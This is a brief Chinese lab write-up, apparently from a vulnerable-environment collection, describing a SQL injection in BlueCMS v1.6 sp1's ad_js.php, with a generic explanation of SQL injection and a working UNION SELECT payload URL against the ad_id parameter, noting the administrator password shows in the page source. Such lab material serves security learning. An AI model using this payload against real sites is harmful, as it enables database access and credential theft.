# 漏洞名字
**BlueCMS v1.6 sp1 ad_js.php SQL注入漏洞**
# 漏洞描述
SQL Injection：就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。

具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。
首先让我们了解什么时候可能发生SQL Injection。

假设我们在浏览器中输入URL www.sample.com，由于它只是对页面的简单请求无需对数据库动进行动态请求，所以它不存在SQL Injection，当我们输入www.sample.com?testid=23时，我们在URL中传递变量testid，并且提供值为23，由于它是对数据库进行动态查询的请求（其中?testid＝23表示数据库查询变量），所以我们可以该URL中嵌入恶意SQL语句。

# 实践
初始化好环境

![image]({path}/1.png)

在浏览器输入
```
http://ip:port/ad_js.php?ad_id=1%20and%201=2%20union%20select%201,2,3,4,5,md5(3.1415),md5(3.1415)
```
右键查看源代码

![image]({path}/2.png)

管理员的密码就隐藏在html中

![image]({path}/3.png)